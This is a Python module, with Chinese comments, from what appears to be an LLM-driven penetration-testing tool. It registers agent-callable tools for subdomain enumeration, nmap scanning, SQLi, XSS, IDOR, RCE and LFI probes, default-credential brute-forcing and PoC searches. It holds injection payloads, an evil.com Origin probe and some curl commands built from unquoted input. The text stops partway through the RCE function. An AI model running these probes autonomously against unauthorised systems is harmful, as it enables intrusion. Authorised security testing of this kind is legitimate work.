"""安全工具集 — 将现有模块注册为 AgentLoop 可调用的工具

将侦察、扫描、情报、报告四大模块的函数包装为 ToolDefinition，
让 LLM 通过 function calling 自主决定调用哪个工具。
"""
from __future__ import annotations

import json
import logging
import shlex
from typing import Any

from jianlai.core.tools import ToolDefinition, ToolResult, ToolRegistry, create_default_registry
from jianlai.core.findings_pool import FindingsPool, SharedFinding
from jianlai.core.shell_executor import run_command, run_commands, resolve_tool, check_tool_exists

logger = logging.getLogger(__name__)


def register_all_tools(
    registry: ToolRegistry,
    pool: FindingsPool,
    llm=None,
    db=None,
    target: str = "",
) -> ToolRegistry:
    """注册所有安全工具到 AgentLoop"""

    # ========== 侦察工具 ==========

    registry.register(ToolDefinition(
        name="subdomain_enum",
        description="子域名枚举。使用 subfinder 枚举目标的子域名列表。",
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "目标域名"},
            },
            "required": ["domain"],
        },
        execution_mode="sequential",
        safety_level="read_only",
        category="recon",
        execute=lambda domain: _subdomain_enum(domain, pool),
    ))

    registry.register(ToolDefinition(
        name="port_scan",
        description="端口扫描。使用 nmap 扫描目标的开放端口和服务版本。",
        parameters={
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "目标主机"},
                "ports": {"type": "string", "description": "端口范围，如 '1-1000' 或 '80,443,3000'"},
            },
            "required": ["host"],
        },
        execution_mode="sequential",
        safety_level="read_only",
        category="recon",
        execute=lambda host, ports="80,443,3000,5000,8000,8080,8443": _port_scan(host, ports, pool),
    ))

    registry.register(ToolDefinition(
        name="http_probe",
        description="HTTP 探测。获取目标的 HTTP 响应头、状态码、技术栈指纹。",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "目标 URL"},
            },
            "required": ["url"],
        },
        execution_mode="parallel",
        safety_level="read_only",
        category="recon",
        execute=lambda url: _http_probe(url, pool),
    ))

    registry.register(ToolDefinition(
        name="api_enum",
        description="API 端点枚举。探测常见的 REST API 和 GraphQL 端点。",
        parameters={
            "type": "object",
            "properties": {
                "base_url": {"type": "string", "description": "目标基础 URL"},
            },
            "required": ["base_url"],
        },
        execution_mode="parallel",
        safety_level="read_only",
        category="recon",
        execute=lambda base_url: _api_enum(base_url, pool),
    ))

    registry.register(ToolDefinition(
        name="js_analyze",
        description="JS 文件分析。提取 API 端点、敏感信息、GraphQL 查询。",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "目标 URL"},
            },
            "required": ["url"],
        },
        execution_mode="parallel",
        safety_level="read_only",
        category="recon",
        execute=lambda url: _js_analyze(url, pool),
    ))

    # ========== 漏洞扫描工具 ==========

    registry.register(ToolDefinition(
        name="test_sqli",
        description="SQL 注入检测。测试 URL 参数和 API 端点的 SQL 注入漏洞（Error-based/Boolean/Time-based）。",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "目标 URL"},
                "param": {"type": "string", "description": "要测试的参数名（可选，不指定则测试所有参数）"},
            },
            "required": ["url"],
        },
        execution_mode="sequential",
        safety_level="controlled",
        category="scan",
        execute=lambda url, param="": _test_sqli(url, param, pool),
    ))

    registry.register(ToolDefinition(
        name="test_xss",
        description="XSS 检测。测试 Reflected XSS 和 CSP 绕过。",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "目标 URL"},
                "param": {"type": "string", "description": "要测试的参数名（可选）"},
            },
            "required": ["url"],
        },
        execution_mode="sequential",
        safety_level="controlled",
        category="scan",
        execute=lambda url, param="": _test_xss(url, param, pool),
    ))

    registry.register(ToolDefinition(
        name="test_idor",
        description="IDOR 检测。测试 API 端点的越权访问（ID枚举、HTTP方法切换、Mass Assignment）。",
        parameters={
            "type": "object",
            "properties": {
                "endpoint": {"type": "string", "description": "API 端点 URL"},
            },
            "required": ["endpoint"],
        },
        execution_mode="sequential",
        safety_level="controlled",
        category="scan",
        execute=lambda endpoint: _test_idor(endpoint, pool),
    ))

    registry.register(ToolDefinition(
        name="test_graphql",
        description="GraphQL 检测。测试内省查询泄露、注入、Batching 攻击、深度查询 DoS。",
        parameters={
            "type": "object",
            "properties": {
                "endpoint": {"type": "string", "description": "GraphQL 端点 URL"},
            },
            "required": ["endpoint"],
        },
        execution_mode="sequential",
        safety_level="controlled",
        category="scan",
        execute=lambda endpoint: _test_graphql(endpoint, pool),
    ))

    registry.register(ToolDefinition(
        name="test_cors",
        description="CORS 配置检测。测试 Origin 反射、null Origin、Vary: Origin 缺失。",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "目标 URL"},
            },
            "required": ["url"],
        },
        execution_mode="sequential",
        safety_level="read_only",
        category="scan",
        execute=lambda url: _test_cors(url, pool),
    ))

    registry.register(ToolDefinition(
        name="test_headers",
        description="安全头审计。检查 HSTS、CSP、X-Frame-Options 等安全头。",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "目标 URL"},
            },
            "required": ["url"],
        },
        execution_mode="sequential",
        safety_level="read_only",
        category="scan",
        execute=lambda url: _test_headers(url, pool),
    ))

    # ========== 情报工具 ==========

    registry.register(ToolDefinition(
        name="cve_query",
        description="CVE 漏洞查询。根据技术名称查询 NVD 漏洞库中的相关 CVE。",
        parameters={
            "type": "object",
            "properties": {
                "keyword": {"type": "string", "description": "技术名称（如 'Node.js', 'Express', 'Angular'）"},
                "min_cvss": {"type": "number", "description": "最低 CVSS 评分（默认 5.0）"},
            },
            "required": ["keyword"],
        },
        execution_mode="sequential",
        safety_level="read_only",
        category="intel",
        execute=lambda keyword, min_cvss=5.0: _cve_query(keyword, min_cvss),
    ))

    registry.register(ToolDefinition(
        name="poc_search",
        description="PoC 搜索。在 GitHub 搜索指定 CVE 的 PoC/EXP 代码。",
        parameters={
            "type": "object",
            "properties": {
                "cve_id": {"type": "string", "description": "CVE 编号（如 'CVE-2024-1234'）"},
            },
            "required": ["cve_id"],
        },
        execution_mode="sequential",
        safety_level="read_only",
        category="intel",
        execute=lambda cve_id: _poc_search(cve_id),
    ))

    # ========== 分析工具 ==========

    registry.register(ToolDefinition(
        name="analyze_findings",
        description="分析发现。使用 LLM 分析当前所有发现，生成综合评估和下一步建议。",
        parameters={
            "type": "object",
            "properties": {
                "focus": {"type": "string", "description": "分析重点（如 'SQLi', 'IDOR', '整体风险'）"},
            },
        },
        execution_mode="sequential",
        safety_level="read_only",
        category="analyze",
        execute=lambda focus="": _analyze_findings(pool, llm, focus),
    ))

    registry.register(ToolDefinition(
        name="get_findings_summary",
        description="获取当前所有发现的摘要（注入点、已确认漏洞、API端点）。",
        parameters={"type": "object", "properties": {}},
        execution_mode="sequential",
        safety_level="read_only",
        category="analyze",
        execute=lambda: _get_findings_summary(pool),
    ))

    # ========== 报告工具 ==========

    registry.register(ToolDefinition(
        name="generate_report",
        description="生成漏洞报告。将所有发现生成 SRC 格式的 Markdown 报告。",
        parameters={
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "目标域名"},
            },
            "required": ["target"],
        },
        execution_mode="sequential",
        safety_level="read_only",
        category="report",
        execute=lambda target: _generate_report(target, pool, llm),
    ))

    registry.register(ToolDefinition(
        name="complete_task",
        description="完成任务。标记安全评估任务已完成，触发最终报告生成。",
        parameters={
            "type": "object",
            "properties": {
                "summary": {"type": "string", "description": "任务完成总结"},
            },
        },
        execution_mode="sequential",
        safety_level="read_only",
        category="report",
        execute=lambda summary="": _complete_task(summary),
    ))

    # ========== 新增：爬虫 + 表单测试 + 传统漏洞 ==========

    registry.register(ToolDefinition(
        name="web_crawl",
        description="Web页面爬取。从目标URL递归爬取所有页面链接，发现隐藏路径和API端点。",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "起始URL"},
                "max_pages": {"type": "integer", "description": "最大爬取页面数（默认50）"},
            },
            "required": ["url"],
        },
        execution_mode="sequential",
        safety_level="read_only",
        category="recon",
        execute=lambda url, max_pages=50: _web_crawl(url, max_pages),
    ))

    registry.register(ToolDefinition(
        name="form_test",
        description="表单漏洞测试。自动解析HTML表单，用POST方式测试SQL注入和XSS。适用于传统Web应用（非API）。",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "包含表单的页面URL"},
            },
            "required": ["url"],
        },
        execution_mode="sequential",
        safety_level="controlled",
        category="scan",
        execute=lambda url: _form_test(url, pool),
    ))

    registry.register(ToolDefinition(
        name="test_rce",
        description="远程命令/代码执行检测。测试eval()、system()、ping等RCE向量。",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "目标URL"},
                "param": {"type": "string", "description": "要测试的参数名（可选）"},
            },
            "required": ["url"],
        },
        execution_mode="sequential",
        safety_level="restricted",
        category="scan",
        execute=lambda url, param="": _test_rce(url, param, pool),
    ))

    registry.register(ToolDefinition(
        name="test_lfi",
        description="文件包含漏洞检测。测试本地文件包含(LFI)和远程文件包含(RFI)。",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "目标URL"},
                "param": {"type": "string", "description": "要测试的参数名（可选）"},
            },
            "required": ["url"],
        },
        execution_mode="sequential",
        safety_level="controlled",
        category="scan",
        execute=lambda url, param="": _test_lfi(url, param, pool),
    ))

    registry.register(ToolDefinition(
        name="test_bruteforce",
        description="登录暴力破解测试。尝试常见默认凭据登录。",
        parameters={
            "type": "object",
            "properties": {
                "login_url": {"type": "string", "description": "登录页面URL"},
                "username_field": {"type": "string", "description": "用户名字段名（默认username）"},
                "password_field": {"type": "string", "description": "密码字段名（默认password）"},
            },
            "required": ["login_url"],
        },
        execution_mode="sequential",
        safety_level="controlled",
        category="scan",
        execute=lambda login_url, username_field="username", password_field="password": _test_bruteforce(login_url, username_field, password_field, pool),
    ))

    registry.register(ToolDefinition(
        name="test_deserialization",
        description="PHP反序列化漏洞检测。测试 unserialize() 相关漏洞。",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "目标URL"},
            },
            "required": ["url"],
        },
        execution_mode="sequential",
        safety_level="controlled",
        category="scan",
        execute=lambda url: _test_deserialization(url, pool),
    ))

    logger.info("[tools] 注册 %d 个安全工具", len(registry.get_all()))
    return registry


# ========== 工具实现 ==========

async def _subdomain_enum(domain: str, pool: FindingsPool) -> ToolResult:
    """子域名枚举"""
    if not check_tool_exists("subfinder"):
        return ToolResult(content="subfinder 未安装", is_error=True)

    bin_path = resolve_tool("subfinder")
    r = await run_command([bin_path, "-d", domain, "-silent", "-all"], timeout=120)

    subs = [l.strip() for l in r.lines if l.strip() and "." in l.strip()]
    if domain not in subs:
        subs.insert(0, domain)

    for sub in subs:
        pool.add(SharedFinding(
            source="subdomain_enum", vuln_type="subdomain",
            target_url=sub, detail=f"子域名: {sub}",
        ))

    return ToolResult(content=f"发现 {len(subs)} 个子域名:\n" + "\n".join(subs[:50]))


async def _port_scan(host: str, ports: str, pool: FindingsPool) -> ToolResult:
    """端口扫描"""
    bin_path = resolve_tool("nmap")
    r = await run_command([bin_path, "-sV", "-T4", "-p", ports, "-oX", "-", host], timeout=120)

    open_ports = []
    import re
    for match in re.finditer(r'portid="(\d+)".*?state="open".*?service\s+name="([^"]*)"', r.stdout, re.DOTALL):
        port_num, service = match.groups()
        open_ports.append(f"  {port_num}/tcp — {service}")
        pool.add(SharedFinding(
            source="port_scan", vuln_type="open_port",
            target_url=f"{host}:{port_num}", detail=f"{service}",
        ))

    if not open_ports:
        return ToolResult(content=f"未发现开放端口 (扫描范围: {ports})")

    return ToolResult(content=f"发现 {len(open_ports)} 个开放端口:\n" + "\n".join(open_ports))


async def _http_probe(url: str, pool: FindingsPool) -> ToolResult:
    """HTTP 探测"""
    r = await run_command(f"curl -sI -m 10 -L {shlex.quote(url)}", timeout=15)
    if not r.success:
        return ToolResult(content=f"HTTP 探测失败: {r.stderr}", is_error=True)

    headers = r.stdout
    import re
    status = re.search(r'HTTP/\S+\s+(\d+)', headers)
    server = re.search(r'(?i)^server:\s*(.+)', headers, re.MULTILINE)
    powered = re.search(r'(?i)^x-powered-by:\s*(.+)', headers, re.MULTILINE)

    info = {
        "status": status.group(1) if status else "?",
        "server": server.group(1).strip() if server else "",
        "powered_by": powered.group(1).strip() if powered else "",
    }

    pool.add(SharedFinding(
        source="http_probe", vuln_type="http_info",
        target_url=url, detail=json.dumps(info),
    ))

    return ToolResult(content=json.dumps(info, indent=2))


async def _api_enum(base_url: str, pool: FindingsPool) -> ToolResult:
    """API 端点枚举"""
    paths = [
        "/api", "/api/v1", "/api/v2", "/api/users", "/api/products",
        "/api/feedbacks", "/api/orders", "/api/auth", "/api/login",
        "/api/search", "/api/config", "/api/admin", "/api/challenges",
        "/graphql", "/gql", "/swagger.json", "/openapi.json",
    ]

    base = base_url.rstrip("/")
    found = []

    from jianlai.core.shell_executor import run_commands
    safe_base = shlex.quote(base)
    cmds = [f"curl -s -o /dev/null -w '%{{http_code}} {base}{p}' -m 3 {shlex.quote(base + p)}" for p in paths]
    results = await run_commands(cmds, timeout=5, max_concurrent=10)

    for r in results:
        if r.success and r.stdout.strip():
            parts = r.stdout.strip().split(" ", 1)
            if len(parts) == 2:
                code, url = parts
                code = code.strip("'\" ")
                if code in ("200", "201", "401", "403"):
                    path = url.replace(base, "")
                    found.append(f"  {path} ({code})")
                    pool.add(SharedFinding(
                        source="api_enum", vuln_type="api_endpoint",
                        target_url=f"{base}{path}", detail=f"HTTP {code}",
                    ))

    return ToolResult(content=f"发现 {len(found)} 个 API 端点:\n" + "\n".join(found) if found else "未发现 API 端点")


async def _js_analyze(url: str, pool: FindingsPool) -> ToolResult:
    """JS 文件分析"""
    r = await run_command(f"curl -sL -m 10 {shlex.quote(url)}", timeout=15)
    if not r.success:
        return ToolResult(content="获取页面失败", is_error=True)

    import re
    from urllib.parse import urlparse
    parsed = urlparse(url)

    # 提取 JS URL
    js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', r.stdout)
    endpoints = set()
    secrets = []

    for js_url in js_urls[:5]:
        if not js_url.startswith("http"):
            base_path = parsed.path.rsplit("/", 1)[0] if "/" in parsed.path else ""
            js_url = f"{parsed.scheme}://{parsed.netloc}{base_path}/{js_url}"

        js_r = await run_command(f"curl -sL -m 10 {shlex.quote(js_url)}", timeout=15)
        if not js_r.success:
            continue

        # API 端点
        for ep in re.findall(r'["\']/(api|v[0-9]+)/[^"\']{3,}["\']', js_r.stdout):
            endpoints.add(ep)

        # 敏感信息
        for pattern, stype in [
            (r'(?:password|passwd)\s*[:=]\s*["\']([^"\']{4,})["\']', "password"),
            (r'(?:api[_-]?key|apikey)\s*[:=]\s*["\']([^"\']{8,})["\']', "api_key"),
        ]:
            for match in re.findall(pattern, js_r.stdout, re.IGNORECASE):
                secrets.append(f"  [{stype}] {match[:20]}...")
                pool.add(SharedFinding(
                    source="js_analyze", vuln_type="sensitive_info",
                    target_url=js_url, detail=f"{stype}: {match[:30]}",
                    severity="high",
                ))

    parts = [f"JS 分析完成 — {len(js_urls)} 个 JS 文件"]
    if endpoints:
        parts.append(f"API 端点: {', '.join(list(endpoints)[:10])}")
    if secrets:
        parts.append("敏感信息:\n" + "\n".join(secrets))

    return ToolResult(content="\n".join(parts))


async def _test_sqli(url: str, param: str, pool: FindingsPool) -> ToolResult:
    """SQL 注入检测（简化版，适配 AgentLoop）"""
    from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
    import re

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return ToolResult(content=f"URL 无可测试参数: {url}")

    error_patterns = re.compile(
        r"(?i)(sql syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|sqlite3\.OperationalError|"
        r"You have an error in your SQL syntax|SQLSTATE\[|Syntax error)",
    )

    test_params = list(params.keys()) if not param else [param]
    results = []

    for pname in test_params:
        for payload in ["'", "' OR '1'='1", "' AND SLEEP(5)--"]:
            test_params_dict = {k: v[0] for k, v in params.items()}
            test_params_dict[pname] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params_dict)))

            r = await run_command(f"curl -sL -m 10 {shlex.quote(test_url)}", timeout=15)
            if r.success and error_patterns.search(r.stdout):
                results.append(f"  [CONFIRMED] 参数 {pname}: SQL 错误 (payload: {payload})")
                pool.add(SharedFinding(
                    source="test_sqli", vuln_type="sqli",
                    target_url=url, parameter=pname,
                    payload=payload, severity="critical",
                    confidence="confirmed",
                    detail=f"Error-based SQLi on param {pname}",
                ))
                break

    if results:
        return ToolResult(content=f"SQLi 检测结果:\n" + "\n".join(results))
    return ToolResult(content=f"未发现 SQL 注入 (测试了 {len(test_params)} 个参数)")


async def _test_xss(url: str, param: str, pool: FindingsPool) -> ToolResult:
    """XSS 检测"""
    from urllib.parse import urlparse, parse_qs, urlunparse, urlencode

    marker = "cyberXSS42"
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return ToolResult(content=f"URL 无可测试参数: {url}")

    test_params = list(params.keys()) if not param else [param]
    results = []

    for pname in test_params:
        for payload in [f'<script>{marker}</script>', f'">{marker}', f'<img src=x onerror={marker}>']:
            test_params_dict = {k: v[0] for k, v in params.items()}
            test_params_dict[pname] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params_dict)))

            r = await run_command(f"curl -sL -m 10 {shlex.quote(test_url)}", timeout=15)
            if r.success and marker in r.stdout:
                results.append(f"  [CONFIRMED] 参数 {pname}: XSS 反射")
                pool.add(SharedFinding(
                    source="test_xss", vuln_type="xss",
                    target_url=url, parameter=pname,
                    payload=payload, severity="high",
                    confidence="confirmed",
                ))
                break

    if results:
        return ToolResult(content=f"XSS 检测结果:\n" + "\n".join(results))
    return ToolResult(content=f"未发现 XSS (测试了 {len(test_params)} 个参数)")


async def _test_idor(endpoint: str, pool: FindingsPool) -> ToolResult:
    """IDOR 检测"""
    base = endpoint.rstrip("/")
    r1 = await run_command(f"curl -sL -m 10 {shlex.quote(base + '/1')}", timeout=15)
    r2 = await run_command(f"curl -sL -m 10 {shlex.quote(base + '/2')}", timeout=15)

    if r1.success and r2.success and len(r1.stdout) > 50 and len(r2.stdout) > 50:
        if "<!doctype html>" not in r1.stdout.lower()[:200]:
            pool.add(SharedFinding(
                source="test_idor", vuln_type="idor",
                target_url=endpoint, parameter="id",
                severity="high", confidence="probable",
                detail=f"ID=1 ({len(r1.stdout)}B), ID=2 ({len(r2.stdout)}B)",
            ))
            return ToolResult(content=f"IDOR: {endpoint} 支持 ID 访问 (ID=1: {len(r1.stdout)}B, ID=2: {len(r2.stdout)}B)")

    return ToolResult(content=f"未发现 IDOR: {endpoint}")


async def _test_graphql(endpoint: str, pool: FindingsPool) -> ToolResult:
    """GraphQL 检测"""
    introspection = '{"query":"{ __schema { types { name } } }"}'
    r = await run_command(
        f"curl -sL -m 10 -X POST -H 'Content-Type: application/json' -d {shlex.quote(introspection)} {shlex.quote(endpoint)}",
        timeout=15,
    )

    results = []
    if r.success and "__schema" in r.stdout:
        type_count = r.stdout.count('"name"')
        results.append(f"  [内省查询已启用] {type_count} 个类型定义")
        pool.add(SharedFinding(
            source="test_graphql", vuln_type="graphql",
            target_url=endpoint, severity="medium",
            confidence="confirmed",
            detail=f"Introspection enabled, {type_count} types",
        ))

    if results:
        return ToolResult(content=f"GraphQL 检测:\n" + "\n".join(results))
    return ToolResult(content=f"GraphQL: 未发现明显问题 ({endpoint})")


async def _test_cors(url: str, pool: FindingsPool) -> ToolResult:
    """CORS 检测"""
    evil = "https://evil.com"
    r = await run_command(f"curl -sI -m 5 -H {shlex.quote('Origin: ' + evil)} {shlex.quote(url)}", timeout=10)

    if r.success:
        import re
        acao = re.search(r'(?i)^access-control-allow-origin:\s*(.+)', r.stdout, re.MULTILINE)
        if acao:
            origin = acao.group(1).strip()
            if origin == evil:
                pool.add(SharedFinding(
                    source="test_cors", vuln_type="cors",
                    target_url=url, severity="high",
                    confidence="confirmed",
                    detail="任意 Origin 反射",
                ))
                return ToolResult(content=f"CORS: 任意 Origin 反射！ ({origin})")
            elif origin == "*":
                return ToolResult(content="CORS: 通配符 * (低风险)")
            elif origin == "null":
                return ToolResult(content="CORS: 允许 null Origin (高风险)")

    return ToolResult(content="CORS: 未发现配置问题")


async def _test_headers(url: str, pool: FindingsPool) -> ToolResult:
    """安全头审计"""
    r = await run_command(f"curl -sI -m 5 {shlex.quote(url)}", timeout=10)
    if not r.success:
        return ToolResult(content="获取响应头失败", is_error=True)

    headers_lower = r.stdout.lower()
    required = {
        "strict-transport-security": "HSTS",
        "content-security-policy": "CSP",
        "x-frame-options": "X-Frame-Options",
        "x-content-type-options": "X-Content-Type-Options",
        "referrer-policy": "Referrer-Policy",
    }

    missing = []
    for header, name in required.items():
        if header not in headers_lower:
            missing.append(name)
            pool.add(SharedFinding(
                source="test_headers", vuln_type="missing_header",
                target_url=url, severity="medium",
                detail=f"缺失 {name}",
            ))

    if missing:
        return ToolResult(content=f"缺失安全头: {', '.join(missing)}")
    return ToolResult(content="安全头配置完整")


async def _cve_query(keyword: str, min_cvss: float) -> ToolResult:
    """CVE 查询"""
    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={shlex.quote(keyword)}&resultsPerPage=10"
    r = await run_command(f"curl -sL -m 15 {shlex.quote(url)}", timeout=20)

    if not r.success:
        return ToolResult(content="CVE 查询失败", is_error=True)

    try:
        data = json.loads(r.stdout)
        cves = []
        for vuln in data.get("vulnerabilities", [])[:10]:
            cve = vuln.get("cve", {})
            cve_id = cve.get("id", "")
            metrics = cve.get("metrics", {})
            score = 0
            for ver in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
                m = metrics.get(ver, [])
                if m:
                    score = m[0].get("cvssData", {}).get("baseScore", 0)
                    break
            if score >= min_cvss:
                desc = ""
                for d in cve.get("descriptions", []):
                    if d.get("lang") == "en":
                        desc = d.get("value", "")[:100]
                        break
                cves.append(f"  {cve_id} (CVSS: {score}) — {desc}")

        return ToolResult(content=f"CVE 查询 ({keyword}):\n" + "\n".join(cves) if cves else f"未发现 CVE ({keyword})")
    except Exception as e:
        return ToolResult(content=f"CVE 解析失败: {e}", is_error=True)


async def _poc_search(cve_id: str) -> ToolResult:
    """PoC 搜索"""
    search_url = f"https://api.github.com/search/repositories?q={shlex.quote(cve_id + '+poc')}&sort=stars&per_page=3"
    r = await run_command(f"curl -sL -m 15 {shlex.quote(search_url)}", timeout=20)

    if not r.success:
        return ToolResult(content="GitHub 搜索失败", is_error=True)

    try:
        data = json.loads(r.stdout)
        repos = []
        for item in data.get("items", [])[:3]:
            repos.append(f"  {item['full_name']} ({item['stargazers_count']}★) — {(item.get('description') or '')[:60]}")
        return ToolResult(content=f"PoC 搜索 ({cve_id}):\n" + "\n".join(repos) if repos else f"未找到 PoC ({cve_id})")
    except Exception:
        return ToolResult(content="PoC 搜索解析失败", is_error=True)


async def _analyze_findings(pool: FindingsPool, llm, focus: str) -> ToolResult:
    """LLM 分析"""
    if not llm:
        return ToolResult(content="LLM 未配置", is_error=True)

    summary = pool.to_context_string()
    prompt = f"分析以下安全测试发现，评估风险并建议下一步：\n\n{summary}"
    if focus:
        prompt += f"\n\n重点关注: {focus}"

    result = await llm.chat_pro(prompt)
    return ToolResult(content=result)


async def _get_findings_summary(pool: FindingsPool) -> ToolResult:
    """获取发现摘要"""
    return ToolResult(content=pool.to_context_string())


async def _generate_report(target: str, pool: FindingsPool, llm) -> ToolResult:
    """生成报告"""
    if not llm:
        return ToolResult(content="LLM 未配置，无法生成报告", is_error=True)

    summary = pool.to_context_string()
    prompt = (
        f"为 {target} 的安全评估生成一份 Markdown 格式的漏洞报告：\n\n"
        f"{summary}\n\n"
        "报告格式：执行摘要、漏洞详情（含PoC）、修复建议。"
    )

    report = await llm.chat_pro(prompt)

    # 保存报告
    from jianlai.core.config import PROJECT_ROOT
    from pathlib import Path
    import time

    out_dir = PROJECT_ROOT / "output" / "reports"
    out_dir.mkdir(parents=True, exist_ok=True)
    ts = time.strftime("%Y%m%d_%H%M%S")
    safe_target = target.replace(".", "_").replace(":", "_")
    path = out_dir / f"{safe_target}_{ts}.md"
    path.write_text(report, encoding="utf-8")

    return ToolResult(content=f"报告已生成: {path}\n\n{report[:500]}...")


async def _complete_task(summary: str) -> ToolResult:
    """完成任务"""
    return ToolResult(
        content=f"任务完成。{summary}",
        terminate=True,
    )


# ========== 新增工具实现 ==========

async def _web_crawl(url: str, max_pages: int) -> ToolResult:
    """Web 爬取 — 发现所有页面和表单"""
    from jianlai.core.crawler import WebCrawler

    crawler = WebCrawler(max_pages=max_pages)
    results = await crawler.crawl(url)

    pages = results["total_pages"]
    forms = results["total_forms"]
    testable = len(crawler.get_testable_forms())

    lines = [f"爬取完成: {pages} 个页面, {forms} 个表单 ({testable} 个可测试)"]

    # 列出发现的表单
    for form_data in results["forms"][:10]:
        fields = ", ".join(f["name"] for f in form_data["fields"] if f["type"] != "submit")
        lines.append(f"  [{form_data['method']}] {form_data['action']} — 字段: {fields}")

    # 列出发现的页面
    if results["pages"]:
        lines.append(f"\n发现的页面:")
        for page in results["pages"][:20]:
            lines.append(f"  {page['url']} (表单:{page['forms_count']}, 链接:{page['links_count']})")

    return ToolResult(content="\n".join(lines))


async def _form_test(url: str, pool) -> ToolResult:
    """表单漏洞测试 — 解析表单并用 POST 测试 SQLi/XSS"""
    from jianlai.core.crawler import WebCrawler

    # 爬取页面获取表单
    crawler = WebCrawler(max_pages=1)
    results = await crawler.crawl(url)

    if not results["forms"]:
        return ToolResult(content=f"未在 {url} 发现表单")

    findings = []
    import asyncio

    for form_data in results["forms"]:
        action = form_data["action"]
        method = form_data["method"]
        fields = form_data["fields"]

        # 构建正常数据
        normal_data = {}
        for f in fields:
            if f["type"] == "submit":
                continue
            if f["value"]:
                normal_data[f["name"]] = f["value"]
            elif f["type"] == "password":
                normal_data[f["name"]] = "test123"
            else:
                normal_data[f["name"]] = "test"

        # SQL 注入测试（POST 表单）
        sqli_payloads = ["'", "' OR '1'='1", "' OR '1'='1' --", "1' AND SLEEP(5)--"]
        for payload in sqli_payloads[:2]:
            test_data = dict(normal_data)
            for field in fields:
                if field["type"] not in ("submit", "hidden"):
                    test_data[field["name"]] = payload
                    break

            data_str = "&".join(f"{k}={shlex.quote(v)}" for k, v in test_data.items())
            r = await run_command(
                f"curl -sL -m 10 -X {method} -d '{data_str}' '{action}'",
                timeout=15,
            )
            if r.success:
                import re
                sql_errors = re.compile(
                    r"(?i)(sql syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|SQLSTATE|"
                    r"You have an error in your SQL syntax)",
                )
                if sql_errors.search(r.stdout):
                    findings.append(f"  [SQLi] {action} — payload: {payload}")
                    pool.add(SharedFinding(
                        source="form_test", vuln_type="sqli",
                        target_url=action, parameter=list(test_data.keys())[0],
                        payload=payload, severity="critical", confidence="confirmed",
                        detail=f"POST 表单 SQL 注入",
                    ))
                    break

        # XSS 测试（POST 表单）
        xss_marker = "cyberXSS42"
        xss_payload = f'<script>{xss_marker}</script>'
        test_data = dict(normal_data)
        for field in fields:
            if field["type"] not in ("submit", "hidden", "password"):
                test_data[field["name"]] = xss_payload
                break

        data_str = "&".join(f"{k}={shlex.quote(v)}" for k, v in test_data.items())
        r = await run_command(
            f"curl -sL -m 10 -X {method} -d '{data_str}' '{action}'",
            timeout=15,
        )
        if r.success and xss_marker in r.stdout:
            findings.append(f"  [XSS] {action} — 表单字段反射")
            pool.add(SharedFinding(
                source="form_test", vuln_type="xss",
                target_url=action, parameter=list(test_data.keys())[0],
                payload=xss_payload, severity="high", confidence="confirmed",
                detail=f"POST 表单 XSS 反射",
            ))

    if findings:
        return ToolResult(content=f"表单测试完成 ({len(findings)} 个发现):\n" + "\n".join(findings))
    return ToolResult(content=f"表单测试完成: 未发现漏洞 (测试了 {len(results['forms'])} 个表单)")


async def _test_rce(url: str, param: str, pool) -> ToolResult:
    """RCE 检测 — 测试 eval/system/ping 命令执行"""
    from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
    import re

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # 如果没有参数，尝试常见 RCE 参数名
    if not params and not param:
        rce_params = ["cmd", "exec", "command", "ping", "ip", "host", "shell", "query"]
        for rp in rce_params:
            test_url = f"{url}?{rp}=id"
            r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
            if r.success and re.search(r'uid=\d+', r.stdout):
                pool.add(SharedFinding(
                    source="test_rce", vuln_type="rce",
                    target_url=test_url, parameter=rp,
                    payload="id", severity="critical", confidence="confirmed",
                    detail="RCE via parameter injection",
                ))
                return ToolResult(content=f"[CRITICAL] RCE 发现! 参数: {rp}, URL: {test_url}")

        # POST 表单测试
        for rp in rce_params:
            r = await run_command(
                f"curl -sL -m 10 -X POST -d '{rp}=id' '{url}'",
                timeout=15,
            )
            if r.success and re.search(r'uid=\d+', r.stdout):
                pool.add(SharedFinding(
                    source="test_rce", vuln_type="rce",
                    target_url=url, parameter=rp,
                    payload="id", severity="critical", confidence="confirmed",
                    detail="RCE via POST parameter injection",
                ))
                return ToolResult(content=f"[CRITICAL] RCE 发现! POST 参数: {rp}")

        return ToolResult(content="未发现 RCE 漏洞")

    # 有参数时测试
    test_params = list(params.keys()) if params else [param]
    for pname in test_params:
        test_params_dict = {k: v[0] for k, v in params.items()}
        test_params_dict[pname] = "id"
        test_url = urlunparse(parsed._replace(query=urlencode(test_params_dict)))

        r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
        if r.success and re.search(r'uid=\d+', r.stdout):
            pool.add(SharedFinding(
                source="test_rce", vuln_type="rce",
                target_url=url, parameter=pname,
                payload="id", severity="critical", confidence="confirmed",
                detail="RCE via URL parameter",
            ))
            return ToolResult(content=f"[CRITICAL] RCE 发现! 参数: {pname}")

